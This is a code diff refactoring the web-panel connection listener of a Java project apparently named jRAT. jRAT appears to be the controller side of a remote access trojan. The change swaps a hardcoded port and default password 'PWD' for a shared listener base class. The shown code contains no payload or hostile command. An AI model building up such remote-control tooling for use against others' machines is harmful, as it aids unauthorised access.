@@ -1,40 +1,31 @@
 package se.jrat.client.webpanel;
 
-import java.net.ServerSocket;
 import java.net.Socket;
 
+import se.jrat.client.net.PortListener;
+import se.jrat.client.settings.Sockets;
 import se.jrat.common.hash.Sha1;
 
-public class WebPanelListener implements Runnable {
+public class WebPanelListener extends PortListener implements Runnable {
 
 	private boolean running;
-	private int port;
-	private String pass;
 	
-	public WebPanelListener() {
-		this.port = 1335;
-		this.pass = "PWD";
-	}
-	
-	public WebPanelListener(int port, String pass) {
-		this.port = port;
-		this.pass = pass;
+	public WebPanelListener(String name, int port, String pass) throws Exception {
+		super(name, port, -1, pass, Sockets.SocketType.WEB_PANEL_SOCKET);
 	}
 	
 	@Override
 	public void run() {
 		running = true;
-		try {
-			ServerSocket serverSocket = new ServerSocket(port);
-			
-			while (isRunning()) {
-				Socket socket = serverSocket.accept();
+		try {			
+			while (isRunning() && !server.isClosed()) {
+				Socket socket = server.accept();
 
 				WebPanelConnection wpc = new WebPanelConnection(this, socket);
 				new Thread(wpc).start();
 			}
 			
-			serverSocket.close();
+			server.close();
 		} catch (Exception ex) {
 			ex.printStackTrace();
 		}
